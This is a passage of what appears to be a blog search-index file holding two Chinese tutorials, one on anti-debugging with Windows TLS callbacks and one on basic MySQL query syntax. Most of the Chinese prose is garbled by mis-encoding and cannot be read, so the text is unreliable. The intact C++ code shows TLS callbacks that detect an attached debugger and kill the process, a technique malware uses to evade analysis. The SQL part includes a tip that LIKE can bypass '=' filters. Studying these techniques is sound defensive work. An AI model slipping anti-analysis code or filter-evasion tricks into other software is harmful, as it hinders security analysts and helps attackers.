Storageå³çº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼›TLSæ˜¯ä¸€ç§<strong>æ–¹æ³•</strong>ï¼Œé€šè¿‡è¿™ç§æ–¹æ³•ï¼Œç»™å®šå¤šçº¿ç¨‹è¿›ç¨‹ä¸­çš„æ¯ä¸ªçº¿ç¨‹å¯ä»¥åˆ†é…ä½ç½®æ¥<strong>å­˜å‚¨ç‰¹å®šäºçº¿ç¨‹çš„æ•°æ®</strong>ã€‚é€šè¿‡TLS API (TlsAlloc)æ”¯æŒ**åŠ¨æ€ç»‘å®š(è¿è¡Œæ—¶)<strong>ç‰¹å®šäºçº¿ç¨‹çš„æ•°æ®ã€‚Win32å’ŒMicrosoft c++ç¼–è¯‘å™¨ç°åœ¨é™¤äº†ç°æœ‰çš„APIå®ç°å¤–ï¼Œè¿˜æ”¯æŒ</strong>é™æ€ç»‘å®š(åŠ è½½æ—¶)**æ¯ä¸ªçº¿ç¨‹æ•°æ®ã€‚</p><p>â€‹TLSä¸»è¦æ˜¯ä¸ºäº†è§£å†³å¤šçº¿ç¨‹ä¸­å˜é‡çš„<strong>åŒæ­¥</strong>é—®é¢˜ï¼Œè¿›ç¨‹ä¸­çš„å…¨å±€å˜é‡å’Œå‡½æ•°å†…å®šä¹‰çš„é™æ€(static)å˜é‡ï¼Œæ˜¯æ¯ä¸ªçº¿ç¨‹éƒ½å¯ä»¥è®¿é—®çš„<strong>å…±äº«å˜é‡</strong>ã€‚åªè¦æœ‰ä»»ä½•ä¸€ä¸ªçº¿ç¨‹ä¿®æ”¹äº†å…±äº«å˜é‡ï¼Œå…¶ä»–æ‰€æœ‰çº¿ç¨‹ä¸­çš„å…±äº«å˜é‡ä¹Ÿä¼š<strong>åŒæ­¥è¢«ä¿®æ”¹</strong></p><p>â€‹TLSå˜é‡å³ï¼šåŒä¸€ä¸ªçº¿ç¨‹é‡Œé¢è°ƒç”¨çš„å„ä¸ªå‡½æ•°éƒ½å¯ä»¥è®¿é—®ã€ä½†å…¶ä»–çº¿ç¨‹æ— æ³•è®¿é—®çš„å˜é‡ï¼ˆè¢«ç§°ä¸ºstatic memory local to a thread çº¿ç¨‹å±€éƒ¨é™æ€å˜é‡ï¼‰</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">//TLSæµ‹è¯•ä»£ç __declspec(thread) int global = 600; //å£°æ˜TLSå˜é‡DWORD WINAPI threadFunc1(LPVOID parameter) {global = 666;std::cout &lt;&lt; "Thread1 global value set to " &lt;&lt; global &lt;&lt; std::endl;return 0;}DWORD WINAPI threadFunc2(LPVOID parameter) {Sleep(200); //ç­‰å¾…200msï¼Œä½¿å¾—çº¿ç¨‹1å…ˆè¾“å‡ºå®Œæ¯•std::cout &lt;&lt; "Thread2 global value set to " &lt;&lt; global &lt;&lt; std::endl;return 0;}void TLSTest() {HANDLE hThread1 = CreateThread(NULL, NULL, threadFunc1, NULL, NULL, NULL);HANDLE hThread2 = CreateThread(NULL, NULL, threadFunc2, NULL, NULL, NULL);::WaitForSingleObject(hThread2, -1);::CloseHandle(hThread1);::CloseHandle(hThread2);system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»ç»“æœå¯ä»¥çœ‹å‡ºï¼Œå…¨å±€å˜é‡åœ¨çº¿ç¨‹1ä¸­å·²ç»è¢«ä¿®æ”¹ä¸º666ï¼Œä½†æ˜¯åœ¨çº¿ç¨‹2ä¸­ä¾ç„¶ä¸º600ï¼›</p><p><img src="/2023/04/04/antibebug/3.png"></p><h5 id="TLSé™æ€ç»‘å®š"><a href="#TLSé™æ€ç»‘å®š" class="headerlink" title="TLSé™æ€ç»‘å®š"></a>TLSé™æ€ç»‘å®š</h5><p>TLSé™æ€ç»‘å®šä¸»è¦ä½“ç°åœ¨<strong>TLSå›è°ƒå‡½æ•°</strong>ä¸Š</p><ul><li><p>ç¨‹åºå¯ä»¥æä¾›<strong>ä¸€ä¸ªæˆ–å¤šä¸ª</strong>TLSå›è°ƒå‡½æ•°ï¼Œä»¥æ”¯æŒTLSæ•°æ®å¯¹è±¡çš„é™„åŠ åˆå§‹åŒ–å’Œç»ˆæ­¢ï¼›</p></li><li><p>å°½ç®¡é€šå¸¸åªæœ‰ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œä½†å›è°ƒå‡½æ•°æ˜¯ä½œä¸º<strong>æ•°ç»„</strong>å®ç°çš„ï¼Œä»¥ä¾¿åœ¨éœ€è¦æ—¶å¯ä»¥æ·»åŠ é¢å¤–çš„å›è°ƒå‡½æ•°ï¼›</p></li><li><p>å¦‚æœæœ‰å¤šä¸ªå›è°ƒå‡½æ•°ï¼Œåˆ™<strong>æŒ‰å…¶åœ°å€åœ¨æ•°ç»„ä¸­å‡ºç°çš„é¡ºåº</strong>è°ƒç”¨æ¯ä¸ªå‡½æ•°ã€‚<strong>ç©ºæŒ‡é’ˆç»ˆæ­¢æ•°ç»„</strong>ã€‚ç©ºåˆ—è¡¨æ˜¯å®Œå…¨æœ‰æ•ˆçš„(ä¸æ”¯æŒå›è°ƒ)ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå›è°ƒæ•°ç»„åªæœ‰ä¸€ä¸ªæˆå‘˜â€”â€” null ptrï¼ˆç©ºæŒ‡é’ˆï¼‰ã€‚</p></li></ul><p>ä½¿ç”¨TLSé™æ€ç»‘å®šä¸‰éƒ¨æ›²ï¼š</p><ul><li><p>1ï¼‰ç¼–è¯‘å™¨å£°æ˜ä½¿ç”¨TLS</p></li><li><p>2ï¼‰å®šä¹‰TLSå›è°ƒå‡½æ•°</p></li><li><p>3ï¼‰æ³¨å†ŒTLSå›è°ƒå‡½æ•°</p></li></ul><p>åè°ƒè¯•åŸç†ï¼š</p><ul><li>TLSå›è°ƒå‡½æ•°: <strong>åˆ›å»ºæˆ–ç»ˆæ­¢æŸçº¿ç¨‹æ—¶,TLSå‡½æ•°ä¼šè‡ªåŠ¨è°ƒç”¨æ‰§è¡Œ</strong></li><li>TLSå‡½æ•°åœ¨EPä¹‹å‰æ‰§è¡Œ,å› æ­¤å¯ä»¥å°†åè°ƒè¯•çš„ä»£ç æ”¾åœ¨TLSå›è°ƒå‡½æ•°é‡Œé¢</li></ul><p><strong>CheckRemoteDebuggerPresent() API</strong></p><ul><li>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸ºè¦Checkçš„è¿›ç¨‹çš„å¥æŸ„ï¼›</li><li>ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¸ºä¸€ä¸ªPBOOLï¼Œè¡¨ç¤ºå½“å‰è¿›ç¨‹æ˜¯å¦å¤„äºè°ƒè¯•çŠ¶æ€</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">//TLSé™æ€ç»‘å®š//1ã€ç¼–è¯‘å™¨å£°æ˜ä½¿ç”¨TLS#ifdef _WIN64       //64ä½#pragma comment (linker, "/INCLUDE:_tls_used")  #pragma comment (linker, "/INCLUDE:tls_callback_func") #else               //32ä½#pragma comment (linker, "/INCLUDE:__tls_used") #pragma comment (linker, "/INCLUDE:_tls_callback_func")#endif//2ã€å®šä¹‰TLSå›è°ƒå‡½æ•°void NTAPI tls_callback0(PVOID Dllhandle, DWORD Reason, PVOID Reserved) {BOOL ret;::CheckRemoteDebuggerPresent(::GetCurrentProcess(), &amp;ret);if (ret) {MessageBox(NULL, L"Funk You", L"TLS0AntiDebug", MB_OK);//::ExitProcess(0);}}void NTAPI tls_callback1(PVOID Dllhandle, DWORD Reason, PVOID Reserved) {BOOL ret;::CheckRemoteDebuggerPresent(::GetCurrentProcess(), &amp;ret);if (ret) {MessageBox(NULL, L"Funk You", L"TLS1AntiDebug", MB_OK);::ExitProcess(0);}}//3ã€æ³¨å†ŒTLSå›è°ƒå‡½æ•°/*CRTè¡¨ç¤ºä½¿ç”¨C Runtime æœºåˆ¶Xè¡¨ç¤º æ ‡è¯†åéšæœºLè¡¨ç¤º TLS Callback sectionFä¹Ÿå¯ä»¥æ›¿æ¢æˆB~Yçš„ä»»æ„ä¸€ä¸ªå­—ç¬¦*/#ifdef _WIN64                           //64ä½#pragma const_seg(".CRT$XLF")EXTERN_C const#else#pragma data_seg(".CRT$XLF")        //32ä½EXTERN_C#endifPIMAGE_TLS_CALLBACK tls_callback_func[] = { tls_callback0, tls_callback1, 0 }; //TLSå›è°ƒå‡½æ•°æ•°ç»„ï¼Œä»¥NULLç»“å°¾ã€‚#ifdef _WIN64                           //64ä½#pragma const_seg()#else#pragma data_seg()                  //32ä½#endif //_WIN64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°ç¨‹åºä¼šå…ˆä¾æ¬¡æ‰§è¡ŒTLSå›è°ƒå‡½æ•°</p><p><img src="/2023/04/04/antibebug/5.png" alt="tls_callback0"></p><p><img src="/2023/04/04/antibebug/6.png" alt="tls_callback1"></p>]]></content>
      
      
      <categories>
          
          <category> åè°ƒè¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é™æ€åè°ƒè¯•æŠ€æœ¯ </tag>
            
            <tag> TEBã€PEBã€TLSã€åè°ƒè¯•API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLè¯­æ³•</title>
      <link href="/2023/04/03/sql/"/>
      <url>/2023/04/03/sql/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="ç™»å½•æ•°æ®åº“"><a href="#ç™»å½•æ•°æ®åº“" class="headerlink" title="ç™»å½•æ•°æ®åº“"></a>ç™»å½•æ•°æ®åº“</h3><p>cmdå‘½ä»¤è¡Œè¾“å…¥ï¼š</p><p>mysql -u username -p</p><p>or </p><p>mysql -u username -ppassword(è¿™é‡Œ-pè¦å’Œä½ çš„å¯†ç ç´§é åœ¨ä¸€èµ·)</p><p><img src="/2023/04/03/sql/1.png" alt="1"></p><h3 id="åŸºæœ¬æ“ä½œ"><a href="#åŸºæœ¬æ“ä½œ" class="headerlink" title="åŸºæœ¬æ“ä½œ"></a>åŸºæœ¬æ“ä½œ</h3><h4 id="åˆ›å»ºæ•°æ®åº“ã€è¡¨"><a href="#åˆ›å»ºæ•°æ®åº“ã€è¡¨" class="headerlink" title="åˆ›å»ºæ•°æ®åº“ã€è¡¨"></a>åˆ›å»ºæ•°æ®åº“ã€è¡¨</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> dbname<span class="token punctuation">;</span> <span class="token comment">#åˆ›å»ºæ•°æ®åº“</span><span class="token keyword">DROP</span> <span class="token keyword">DATABASE</span> dbname<span class="token punctuation">;</span>  <span class="token comment">#åˆ é™¤æ•°æ®åº“</span><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> table_nameï¼› <span class="token comment">#åˆ é™¤è¡¨</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> table_name <span class="token comment">#åˆ›å»ºæ•°æ®åº“ä¸­çš„è¡¨</span><span class="token punctuation">(</span>column_name1 data_type<span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token punctuation">(</span>constraint_name<span class="token punctuation">)</span><span class="token punctuation">,</span>column_name2 data_type<span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token punctuation">(</span>constraint_name<span class="token punctuation">)</span><span class="token punctuation">,</span>column_name3 data_type<span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token punctuation">(</span>constraint_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>column_nameï¼šå‚æ•°è§„å®šè¡¨ä¸­åˆ—çš„åç§°<span class="token punctuation">;</span>data_typeï¼šå‚æ•°è§„å®šåˆ—çš„æ•°æ®ç±»å‹ï¼ˆä¾‹å¦‚ <span class="token keyword">varchar</span>ã€<span class="token keyword">integer</span>ã€<span class="token keyword">decimal</span>ã€<span class="token keyword">date</span> ç­‰ç­‰ï¼‰<span class="token punctuation">;</span>sizeï¼šå‚æ•°è§„å®šè¡¨ä¸­åˆ—çš„æœ€å¤§é•¿åº¦ï¼›constraint_name<span class="token punctuation">(</span>å¯é€‰<span class="token punctuation">)</span>ï¼šçº¦æŸåã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>çº¦æŸ(Constraints)</strong></p><p>SQL çº¦æŸç”¨äºè§„å®šè¡¨ä¸­çš„æ•°æ®è§„åˆ™ã€‚å¦‚æœå­˜åœ¨è¿åçº¦æŸçš„æ•°æ®è¡Œä¸ºï¼Œè¡Œä¸ºä¼šè¢«çº¦æŸç»ˆæ­¢ã€‚<strong>çº¦æŸå¯ä»¥åœ¨åˆ›å»ºè¡¨æ—¶è§„å®šï¼ˆé€šè¿‡ CREATE TABLE è¯­å¥ï¼‰ï¼Œæˆ–è€…åœ¨è¡¨åˆ›å»ºä¹‹åè§„å®šï¼ˆé€šè¿‡ ALTER TABLE è¯­å¥ï¼‰</strong>ã€‚</p><p>åœ¨ SQL ä¸­ï¼Œæˆ‘ä»¬æœ‰å¦‚ä¸‹çº¦æŸï¼š</p><ul><li><strong>NOT NULL</strong> - æŒ‡ç¤ºæŸåˆ—ä¸èƒ½å­˜å‚¨ NULL å€¼ã€‚</li><li><strong>UNIQUE</strong> - ä¿è¯æŸåˆ—çš„æ¯è¡Œå¿…é¡»æœ‰å”¯ä¸€çš„å€¼ã€‚</li><li><strong>PRIMARY KEY</strong> - NOT NULL å’Œ UNIQUE çš„ç»“åˆã€‚ç¡®ä¿æŸåˆ—ï¼ˆæˆ–ä¸¤ä¸ªåˆ—å¤šä¸ªåˆ—çš„ç»“åˆï¼‰æœ‰å”¯ä¸€æ ‡è¯†ï¼Œæœ‰åŠ©äºæ›´å®¹æ˜“æ›´å¿«é€Ÿåœ°æ‰¾åˆ°è¡¨ä¸­çš„ä¸€ä¸ªç‰¹å®šçš„è®°å½•ã€‚</li><li><strong>FOREIGN KEY</strong> - ä¿è¯ä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®åŒ¹é…å¦ä¸€ä¸ªè¡¨ä¸­çš„å€¼çš„å‚ç…§å®Œæ•´æ€§ã€‚</li><li><strong>CHECK</strong> - ä¿è¯åˆ—ä¸­çš„å€¼ç¬¦åˆæŒ‡å®šçš„æ¡ä»¶ã€‚</li><li><strong>DEFAULT</strong> - è§„å®šæ²¡æœ‰ç»™åˆ—èµ‹å€¼æ—¶çš„é»˜è®¤å€¼ã€‚</li></ul><h4 id="ALTER-å¾…å†™"><a href="#ALTER-å¾…å†™" class="headerlink" title="ALTER(å¾…å†™)"></a>ALTER(å¾…å†™)</h4><h4 id="DROP-å¾…å†™"><a href="#DROP-å¾…å†™" class="headerlink" title="DROP(å¾…å†™)"></a>DROP(å¾…å†™)</h4><p>æ³¨æ„ï¼šSQLè¯­è¨€ä¸­æ¯æ¡å‘½ä»¤ä»¥<code>;</code>ç»“å°¾ï¼›</p><p>show databases;   ==&gt;  å±•ç°æ‰€æœ‰æ•°æ®åº“å</p><p>show tables;  ==&gt; å±•ç°å½“å‰æ•°æ®åº“çš„æ‰€æœ‰è¡¨å</p><p>use databaseName;  ==&gt; ä½¿ç”¨databaseNameæ•°æ®åº“</p><p><img src="/2023/04/03/sql/2.png"></p><h3 id="æ•°æ®æŸ¥è¯¢è¯­å¥"><a href="#æ•°æ®æŸ¥è¯¢è¯­å¥" class="headerlink" title="æ•°æ®æŸ¥è¯¢è¯­å¥"></a>æ•°æ®æŸ¥è¯¢è¯­å¥</h3><h4 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h4><p>SELECTï¼šç”¨äºä»æ•°æ®åº“ä¸­é€‰å–æ•°æ®ï¼›</p><p>åŸºæœ¬æ ¼å¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>column1, column2, â€¦ï¼šè¦é€‰æ‹©çš„å­—æ®µåç§°ï¼Œå¯ä»¥ä¸ºå¤šä¸ªå­—æ®µã€‚å¦‚æœä¸æŒ‡å®šå­—æ®µåç§°æˆ–æŒ‡å®šä¸º<code>*</code>ï¼Œåˆ™ä¼šé€‰æ‹©æ‰€æœ‰å­—æ®µ;</li><li>table_nameï¼šè¦æŸ¥è¯¢çš„è¡¨åç§°ã€‚</li></ul><p><img src="/2023/04/03/sql/3.png" alt="3"></p><h4 id="SELECT-DISTINCT"><a href="#SELECT-DISTINCT" class="headerlink" title="SELECT DISTINCT"></a>SELECT DISTINCT</h4><p>SELECT DISTINCTï¼šç”¨äºè¿”å›å”¯ä¸€ä¸åŒçš„å€¼ã€‚</p><p>åŸºæœ¬æ ¼å¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>**column1, column2, â€¦**ï¼šè¦é€‰æ‹©çš„å­—æ®µåç§°ï¼Œå¯ä»¥ä¸ºå¤šä¸ªå­—æ®µã€‚å¦‚æœä¸æŒ‡å®šå­—æ®µåç§°æˆ–æŒ‡å®šä¸º<code>*</code>ï¼Œåˆ™ä¼šé€‰æ‹©æ‰€æœ‰å­—æ®µ;</li><li><strong>table_name</strong>ï¼šè¦æŸ¥è¯¢çš„è¡¨åç§°ã€‚</li></ul><p>å¦‚ä¸‹ï¼šå»é™¤äº†cityåˆ—ä¸­çš„é‡å¤å€¼ï¼›</p><p><img src="/2023/04/03/sql/4.png" alt="4"></p><p><strong>Noteï¼š</strong>è‹¥æŒ‡å®šäº†å¤šä¸ªcolumnï¼Œåˆ™è¡¨ç¤ºæ’é™¤columnéƒ½ç›¸ç­‰çš„ï¼›</p><h4 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h4><p>WHEREï¼šè¯¥å­å¥ç”¨äºè¿‡æ»¤è®°å½•ï¼›ç”¨äºæå–é‚£äº›æ»¡è¶³æŒ‡å®šæ¡ä»¶çš„è®°å½•ã€‚</p><p>æ ¼å¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> condition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>conditionï¼šæŒ‡å®šçš„æ¡ä»¶ï¼Œå¯ä»¥ç”¨<code>AND/&amp;&amp;</code>æˆ–è€…<code>OR/||</code>è¿æ¥å¤šä¸ªæ¡ä»¶ï¼Œæˆ–åœ¨conditionå‰åŠ NOTè¡¨ç¤ºå¦å®š;ä¼˜å…ˆçº§ï¼š()&gt;not&gt;and&gt;or;</li><li>columnï¼Œtable_nameè§£é‡Šå¦‚ä¸ŠSELECT;</li></ul><p><img src="/2023/04/03/sql/5.png" alt="5"></p><p><strong>Noteï¼š</strong>SQL ä½¿ç”¨å•å¼•å·<code>''</code>æ¥ç¯ç»•æ–‡æœ¬å€¼(å¯åŒå¼•å·<code>""</code>)ï¼›å¦‚æœæ˜¯æ•°å€¼å­—æ®µï¼Œè¯·ä¸è¦ä½¿ç”¨å¼•å·ã€‚</p><h5 id="å¯åœ¨whereå­å¥ä¸­ä½¿ç”¨çš„è¿ç®—ç¬¦"><a href="#å¯åœ¨whereå­å¥ä¸­ä½¿ç”¨çš„è¿ç®—ç¬¦" class="headerlink" title="å¯åœ¨whereå­å¥ä¸­ä½¿ç”¨çš„è¿ç®—ç¬¦"></a>å¯åœ¨whereå­å¥ä¸­ä½¿ç”¨çš„è¿ç®—ç¬¦</h5><table><thead><tr><th align="left">è¿ç®—ç¬¦</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="left">=</td><td align="center">ç­‰äº</td></tr><tr><td align="left">&lt;&gt;</td><td align="center">ä¸ç­‰äºã€‚<strong>æ³¨é‡Šï¼š</strong>åœ¨ SQL çš„ä¸€äº›ç‰ˆæœ¬ä¸­ï¼Œè¯¥æ“ä½œç¬¦å¯è¢«å†™æˆ !=</td></tr><tr><td align="left">&gt;</td><td align="center">å¤§äº</td></tr><tr><td align="left">&lt;</td><td align="center">å°äº</td></tr><tr><td align="left">&gt;=</td><td align="center">å¤§äºç­‰äº</td></tr><tr><td align="left">&lt;=</td><td align="center">å°äºç­‰äº</td></tr><tr><td align="left">BETWEEN</td><td align="center">åœ¨æŸä¸ªèŒƒå›´å†…</td></tr><tr><td align="left">LIKE</td><td align="center">æœç´¢æŸç§æ¨¡å¼</td></tr><tr><td align="left">IN</td><td align="center">æŒ‡å®šé’ˆå¯¹æŸä¸ªåˆ—çš„å¤šä¸ªå¯èƒ½å€¼</td></tr></tbody></table><h6 id="LIKEè¿ç®—ç¬¦"><a href="#LIKEè¿ç®—ç¬¦" class="headerlink" title="LIKEè¿ç®—ç¬¦"></a>LIKEè¿ç®—ç¬¦</h6><p>LIKEï¼šè¯¥æ“ä½œç¬¦ç”¨äºåœ¨WHERE å­å¥ä¸­æœç´¢åˆ—ä¸­çš„æŒ‡å®šæ¨¡å¼ã€‚</p><p>æ ¼å¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> column_ <span class="token operator">LIKE</span> pattern<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column_ï¼šè¦åŒ¹é…çš„å­—æ®µåç§°ï¼›</li><li>patternï¼šæœç´¢æ¨¡å¼ã€‚</li></ul><p><strong>é€šé…ç¬¦ï¼š</strong>å¯ç”¨äºæ›¿ä»£å­—ç¬¦ä¸²ä¸­çš„ä»»ä½•å…¶ä»–å­—ç¬¦ã€‚</p><table><thead><tr><th align="left">é€šé…ç¬¦</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="left">%</td><td align="center">æ›¿ä»£ 0 ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</td></tr><tr><td align="left">_</td><td align="center">æ›¿ä»£ä¸€ä¸ªå­—ç¬¦</td></tr><tr><td align="left">[<em>charlist</em>]</td><td align="center">å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦</td></tr><tr><td align="left">[^<em>charlist</em>] æˆ– [!<em>charlist</em>]</td><td align="center">ä¸åœ¨å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦</td></tr></tbody></table><p><strong>LIKE ä¸ é€šé…ç¬¦ é…åˆä½¿ç”¨ï¼š</strong></p><p>å½“ likeåé¢ç›´æ¥åŠ å…·ä½“çš„å€¼(column like value)åˆ™ç›¸å½“äº column=vlaueï¼Œå¯ä»¥ç”¨æ¥é¥¶è¿‡<code>=</code>è¿‡æ»¤ï¼›</p><p><img src="/2023/04/03/sql/8.png" alt="8"></p><p><strong>[charlist]é€šé…ç¬¦ï¼š</strong>MySQL ä¸­ä½¿ç”¨ <strong>REGEXP</strong> æˆ– <strong>NOT REGEXP</strong> è¿ç®—ç¬¦ (æˆ– RLIKE å’Œ NOT RLIKE) æ¥æ“ä½œæ­£åˆ™è¡¨è¾¾å¼ã€‚</p><p>æ ¼å¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> column_ <span class="token operator">REGEXP</span> pattern<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column_ï¼šè¦åŒ¹é…çš„å­—æ®µåç§°ï¼›</li><li>patternï¼šæ­£åˆ™è¡¨è¾¾å¼ã€‚</li></ul><p><img src="/2023/04/03/sql/9.png" alt="9"></p><h6 id="INè¿ç®—ç¬¦"><a href="#INè¿ç®—ç¬¦" class="headerlink" title="INè¿ç®—ç¬¦"></a>INè¿ç®—ç¬¦</h6><p>INï¼šè¯¥æ“ä½œç¬¦å…è®¸æ‚¨åœ¨ WHERE å­å¥ä¸­è§„å®šå¤šä¸ªå€¼ã€‚</p><p>æ ¼å¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> column_ <span class="token operator">IN</span> <span class="token punctuation">(</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column_ï¼šè¦åŒ¹é…çš„å­—æ®µåç§°ï¼›</li><li>value1, value2, â€¦ï¼šè¦æŸ¥è¯¢çš„å€¼ï¼Œå¯ä»¥ä¸ºå¤šä¸ªå€¼ã€‚</li></ul><p><img src="/2023/04/03/sql/10.png" alt="10"></p><p>Noteï¼šå…¶å®å°±ç›¸å½“äº column_ = value1 || column_ = value2 || â€¦</p><h6 id="BETWEENè¿ç®—ç¬¦"><a href="#BETWEENè¿ç®—ç¬¦" class="headerlink" title="BETWEENè¿ç®—ç¬¦"></a>BETWEENè¿ç®—ç¬¦</h6><p>BETWEENï¼šè¯¥æ“ä½œç¬¦ç”¨äºé€‰å–ä»‹äºä¸¤ä¸ªå€¼ä¹‹é—´çš„æ•°æ®èŒƒå›´å†…çš„å€¼ã€‚è¿™äº›å€¼å¯ä»¥æ˜¯æ•°å€¼ã€æ–‡æœ¬æˆ–è€…æ—¥æœŸã€‚</p><p>æ ¼å¼ï¼šBETWEEN â€¦ AND â€¦.</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> column_ <span class="token operator">BETWEEN</span> value1 <span class="token operator">AND</span> value2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column_ï¼šè¦åŒ¹é…çš„å­—æ®µåç§°ï¼›</li><li>value1ã€value2ï¼šèŒƒå›´çš„èµ·å§‹å€¼å’Œç»“æŸå€¼ã€‚</li></ul><p><img src="/2023/04/03/sql/6.png" alt="6"></p><p>Noteï¼šå¦‚æœæ˜¯æ–‡æœ¬çš„è¯ï¼ŒæŒ‰ç…§å­—ç¬¦å¯¹åº”çš„æ•°å€¼ä¾æ­¤æ¯”è¾ƒï¼›å¦‚ä¸‹ï¼š</p><p><img src="/2023/04/03/sql/7.png" alt="7"></p><p><strong>Noteï¼š</strong></p><ul><li>åœ¨æŸäº›æ•°æ®åº“ä¸­ï¼ŒBETWEEN ä¸åŒ…æ‹¬ä¸¤ä¸ªæµ‹è¯•å€¼çš„å­—æ®µï¼›</li><li>åœ¨æŸäº›æ•°æ®åº“ä¸­ï¼ŒBETWEEN åŒ…æ‹¬ä¸¤ä¸ªæµ‹è¯•å€¼çš„å­—æ®µï¼›</li><li>åœ¨æŸäº›æ•°æ®åº“ä¸­ï¼ŒBETWEEN åŒ…æ‹¬ç¬¬ä¸€ä¸ªä½†ä¸åŒ…æ‹¬æœ€åä¸€ä¸ªæµ‹è¯•å€¼çš„å­—æ®µã€‚</li></ul><p><strong>WHEREç‰¹æ®Šä½¿ç”¨æƒ…å†µï¼š</strong></p><ul><li>ç›´æ¥ where 0(é0); 0æ—¶è¿”å›ç©ºï¼Œ1æ—¶è¿”å›æ‰€æœ‰æŸ¥è¯¢çš„åˆ—çš„å€¼</li></ul><p><img src="/2023/04/03/sql/11.png" 